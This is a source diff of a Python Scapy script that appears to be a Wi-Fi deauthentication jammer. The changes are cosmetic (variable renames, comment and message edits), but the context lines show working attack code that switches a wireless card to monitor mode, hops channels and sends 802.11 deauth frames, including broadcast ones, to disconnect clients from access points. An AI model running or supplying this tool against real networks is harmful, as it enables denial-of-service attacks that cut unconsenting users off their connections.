@@ -1,10 +1,10 @@
 #!/usr/bin/env python
-# -*- coding: UTF-8 -*-
+# -*- UTF-8 -*-
 
 import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Shut up Scapy
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
 from scapy.all import *
-conf.verb = 0 # Scapy I thought I told you to shut up
+conf.verb = 0 
 import os
 import sys
 import time
@@ -51,7 +51,8 @@ def parse_args():
                         "--maximum",
                         help="Choose the maximum number of clients to deauth. \
                                 List of clients will be emptied and repopulated \
-                                after hitting the limit. Example: -m 5")
+                                after hitting the limit. \
+                                Example: -m 5")
     parser.add_argument("-n",
                         "--noupdate",
                         help="Do not clear the deauth list when the maximum (-m) \
@@ -92,9 +93,9 @@ def parse_args():
     return parser.parse_args()
 
 
-########################################
-# Begin interface info and manipulation
-########################################
+#########################################
+# Begin interface info and manipulation #
+#########################################
 
 def get_mon_iface(args):
     global monitor_on
@@ -109,8 +110,8 @@ def get_mon_iface(args):
         # Start monitor mode on a wireless interface
         print '['+G+'*'+W+'] Finding the most powerful interface...'
         interface = get_iface(interfaces)
-        monmode = start_mon_mode(interface)
-        return monmode
+        mon_mode = start_mon_mode(interface)
+        return mon_mode
 
 def iwconfig():
     monitors = []
@@ -120,11 +121,11 @@ def iwconfig():
     except OSError:
         sys.exit('['+R+'-'+W+'] Could not execute "iwconfig"')
     for line in proc.communicate()[0].split('\n'):
-        if len(line) == 0: continue # Isn't an empty string
-        if line[0] != ' ': # Doesn't start with space
+        if len(line) == 0: continue # Not an empty string
+        if line[0] != ' ': # Does not start with space
             wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
-            if not wired_search: # Isn't wired
-                iface = line[:line.find(' ')] # is the interface
+            if not wired_search: # Not wired
+                iface = line[:line.find(' ')] # interface
                 if 'Mode:Monitor' in line:
                     monitors.append(iface)
                 elif 'IEEE 802.11' in line:
@@ -138,7 +139,7 @@ def get_iface(interfaces):
     scanned_aps = []
 
     if len(interfaces) < 1:
-        sys.exit('['+R+'-'+W+'] No wireless interfaces found, bring one up and try again')
+        sys.exit('['+R+'-'+W+'] No wireless interfaces found, try again')
     if len(interfaces) == 1:
         for interface in interfaces:
             return interface
@@ -159,11 +160,11 @@ def get_iface(interfaces):
         for iface in interfaces:
             interface = iface
             print '['+R+'-'+W+'] Minor error:',e
-            print '    Starting monitor mode on '+G+interface+W
+            print '    Starting monitor mode ON '+G+interface+W
             return interface
 
 def start_mon_mode(interface):
-    print '['+G+'+'+W+'] Starting monitor mode off '+G+interface+W
+    print '['+G+'+'+W+'] Starting monitor mode OFF '+G+interface+W
     try:
         os.system('ifconfig %s down' % interface)
         os.system('iwconfig %s mode monitor' % interface)
@@ -178,26 +179,24 @@ def remove_mon_iface(mon_iface):
     os.system('ifconfig %s up' % mon_iface)
 
 def mon_mac(mon_iface):
-    '''
-    http://stackoverflow.com/questions/159137/getting-mac-address
-    '''
+    #http://stackoverflow.com/questions/159137/getting-mac-address
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
     mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
     print '['+G+'*'+W+'] Monitor mode: '+G+mon_iface+W+' - '+O+mac+W
     return mac
 
-########################################
-# End of interface info and manipulation
-########################################
+##########################################
+# End of interface info and manipulation #
+##########################################
 
 
 def channel_hop(mon_iface, args):
     '''
     First time it runs through the channels it stays on each channel for 5 seconds
-    in order to populate the deauth list nicely. After that it goes as fast as it can
+    in order to populate the deauth list nicely. Afterwards, it's full blast.
     '''
-    global monchannel, first_pass
+    global mon_channel, first_pass
 
     channelNum = 0
     maxChan = 11 if not args.world else 13
@@ -206,7 +205,7 @@ def channel_hop(mon_iface, args):
     while 1:
         if args.channel:
             with lock:
-                monchannel = args.channel
+                mon_channel = args.channel
         else:
             channelNum +=1
             if channelNum > maxChan:
@@ -214,10 +213,10 @@ def channel_hop(mon_iface, args):
                 with lock:
                     first_pass = 0
             with lock:
-                monchannel = str(channelNum)
+                mon_channel = str(channelNum)
 
             try:
-                proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', monchannel], stdout=DN, stderr=PIPE)
+                proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', mon_channel], stdout=DN, stderr=PIPE)
             except OSError:
                 print '['+R+'-'+W+'] Could not execute "iw"'
                 os.kill(os.getpid(),SIGINT)
@@ -226,7 +225,7 @@ def channel_hop(mon_iface, args):
                 if len(line) > 2: # iw dev shouldnt display output unless there's an error
                     err = '['+R+'-'+W+'] Channel hopping failed: '+R+line+W
 
-        output(err, monchannel)
+        output(err, mon_channel)
         if args.channel:
             time.sleep(.05)
         else:
@@ -235,10 +234,10 @@ def channel_hop(mon_iface, args):
                 time.sleep(1)
                 continue
 
-        deauth(monchannel)
+        deauth(mon_channel)
 
 
-def deauth(monchannel):
+def deauth(mon_channel):
     '''
     addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway if there's
     multi-APs to one gateway. Constantly scans the clients_APs list and
@@ -257,7 +256,7 @@ def deauth(monchannel):
                 # Association request packet?
                 # Append the packets to a new list so we don't have to hog the lock
                 # type=0, subtype=12?
-                if ch == monchannel:
+                if ch == mon_channel:
                     deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
                     deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
                     pkts.append(deauth_pkt1)
@@ -268,7 +267,7 @@ def deauth(monchannel):
                 for a in APs:
                     ap = a[0]
                     ch = a[1]
-                    if ch == monchannel:
+                    if ch == mon_channel:
                         deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
                         pkts.append(deauth_ap)
 
@@ -282,12 +281,12 @@ def deauth(monchannel):
         for p in pkts:
             send(p, inter=float(args.timeinterval), count=int(args.packets))
 
-def output(err, monchannel):
+def output(err, mon_channel):
     os.system('clear')
     if err:
         print err
     else:
-        print '['+G+'+'+W+'] '+mon_iface+' channel: '+G+monchannel+W+'\n'
+        print '['+G+'+'+W+'] '+mon_iface+' channel: '+G+mon_channel+W+'\n'
     if len(clients_APs) > 0:
         print '                  Deauthing                 ch   ESSID'
     # Print the deauth list
@@ -398,7 +397,7 @@ def clients_APs_add(clients_APs, addr1, addr2):
     if len(clients_APs) == 0:
         if len(APs) == 0:
             with lock:
-                return clients_APs.append([addr1, addr2, monchannel])
+                return clients_APs.append([addr1, addr2, mon_channel])
         else:
             AP_check(addr1, addr2)
 
@@ -412,7 +411,7 @@ def clients_APs_add(clients_APs, addr1, addr2):
             return AP_check(addr1, addr2)
         else:
             with lock:
-                return clients_APs.append([addr1, addr2, monchannel])
+                return clients_APs.append([addr1, addr2, mon_channel])
 
 def AP_check(addr1, addr2):
     for ap in APs:
@@ -430,7 +429,7 @@ def stop(signal, frame):
 
 if __name__ == "__main__":
     if os.geteuid():
-        sys.exit('['+R+'-'+W+'] Please run as root')
+        sys.exit('['+R+'-'+W+'] Run as root')
     clients_APs = []
     APs = []
     DN = open(os.devnull, 'w')
